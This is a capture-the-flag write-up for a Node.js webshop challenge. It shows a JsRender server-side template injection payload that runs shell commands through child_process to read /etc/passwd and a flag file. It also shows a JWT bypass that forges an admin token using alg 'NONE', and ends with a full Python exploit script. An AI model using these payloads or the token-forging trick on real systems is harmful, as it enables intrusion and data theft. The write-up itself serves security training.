# Didactic Octo Paddle :: Medium

## Scenario

```
You have been hired by the Intergalactic Ministry of Spies to retrieve a powerful relic that is believed to be hidden within the small paddle shop, by the river.
You must hack into the paddle shop's system to obtain information on the relic's location.
Your ultimate challenge is to shut down the parasitic alien vessels and save humanity from certain destruction by retrieving the relic hidden within the Didactic Octo Paddles shop.
```

## Solve

![](/images/didactic-source-tree.png)

The challenge begins with a login prompt.  

![](/images/didactic-login.png)

While looking at the routes defined in the `index.js` file, we stumble upon a `/register` route that let's us create a user.  

![](/images/didactic-register.png)

We create a user.  

![](/images/didactic-user-created.png)

We can then login and see the store:  

![](/images/didactic-webshop.png)

It seems like they're selling litteral paddles.  
It is a webshop.  

### Obtaning RCE

There is an admin page at `/admin`, this page lists the existing users.  

Here is the code of the `admin.jsrender` file:  

```html
<!DOCTYPE html>
<html lang="en">

	<!--- //snip // --->

<body>
  <div class="d-flex justify-content-center align-items-center flex-column" style="height: 100vh;">
    <h1>Active Users</h1>
    <ul class="list-group small-list">
      {{for users.split(',')}}
        <li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>{{>}}</span>
        </li>
      {{/for}}
    </ul>
  </div>
</body>

</html>
```

Here is the code for the `/admin` route.  

```javascript
    router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });
```

There is actually an SSTI vulnerability here.  
The `jsrender.templates` function templates the given string.  
This can actually lead to RCE as detailed in this article:  

- https://appcheck-ng.com/template-injection-jsrender-jsviews
- https://www.jsviews.com/#htmltag

```http
POST /register HTTP/1.1
Host: 10.18.232.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.143.81:30500/register
Content-Type: application/json
Origin: http://138.68.143.81:30500
Content-Length: 40
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5MTQ5NDYyLCJleHAiOjE2NzkxNTMwNjJ9.0_s2fX-jd31nc6fNFQwRZktx-UQm9GnBxK8CvsOct2k

{"username":"{{:7*7}}","password":"gh0st"}
```

This request will cause 49 to appear on the admin's page.  
Now, one question arises, is admin a bot or do we have to elevate ?  

```javascript
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```

This works, it gets RCE on my local instance.  
Now time to figure out the admin situation.  

### Obtaining Admin

While reading the source for `AdminMiddleware.js`, I found a weird condition on the JWT's `alg` value.  
Here is the condition:  

```javascript
// alg == none --> Login
// alg == HS256 --> decode with secret
// else --> Just decode i guess ?

    if (decoded.header.alg == 'none') {
        return res.redirect("/login");
    } else if (decoded.header.alg == "HS256") {
        const user = jwt.verify(sessionCookie, tokenKey, {
            algorithms: [decoded.header.alg],
        });
        if (
            !(await db.Users.findOne({
                where: { id: user.id, username: "admin" },
            }))
        ) {
            return res.status(403).send("You are not an admin");
        }
    } else {
        const user = jwt.verify(sessionCookie, null, {
            algorithms: [decoded.header.alg],
        });
        if (
            !(await db.Users.findOne({
                where: { id: user.id, username: "admin" },
            }))
        ) {
            return res
                .status(403)
                .send({ message: "You are not an admin" });
        }
    }
```

Maybe I can dodge signature validation ?  

Something like a default value for it, or specifying an unsafe algorithm.  

While tinkering with this condition locally, I found an authentication bypass.  

The condition is that the `decoded.header.alg` value equals the string `'none'`.  
There could be a way to bypass this, if the underlying library normalizes the `alg` values coming in the `verify` function.  

This is how we bypass it, we simply specify the `alg` as `'NONE'` instead.  
This goes through to the `else`, which decodes the value and treats the token as valid.  

Using this, we can craft an administrator token.  

Here is our JWT:  

```json
{"alg":"NONE","typ":"JWT"}{"id":1,"iat":1679153124,"exp":1679156724}
```

`alg`: `"NONE"` will bypass the condition.  
`id`: 1 represents the administrator user.  

We encode it: 
```
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MTUzMTI0LCJleHAiOjE2NzkxNTY3MjR9.
```

HERE WE GOOOOO:
```http
GET /admin HTTP/1.1
Host: 10.18.232.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MTUzMTI0LCJleHAiOjE2NzkxNTY3MjR9.;
Upgrade-Insecure-Requests: 1

```
  
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1020
Date: Fri, 24 Mar 2023 01:45:03 GMT
Connection: close

<!DOCTYPE html>

//snip //
```

Now that we can visit the admin page, we put it all together and create a malicious user to extract the flag.  

## Script

```python
#!/usr/bin/env python3
import requests

TARGET = "http://127.0.0.1:1337
ADMIN_ENDPOINT = "/admin"
AUTH_BYPASS_SESSION = "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MTUzMTI0LCJleHAiOjE2NzkxNTY3MjR9."
REGISTER_ENDPOINT = "/register"
JSRENDER_SSTI = \
        "{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}"


if __name__ == "__main__":
    s = requests.Session()
    r = requests.post(TARGET + REGISTER_ENDPOINT, json={"username": JSRENDER_SSTI, "password": "O0ops"})
    s.cookies.set("session", AUTH_BYPASS_SESSION, domain="127.0.0.1")
    flag = s.get(TARGET + ADMIN_ENDPOINT)
    print(flag.text)
```

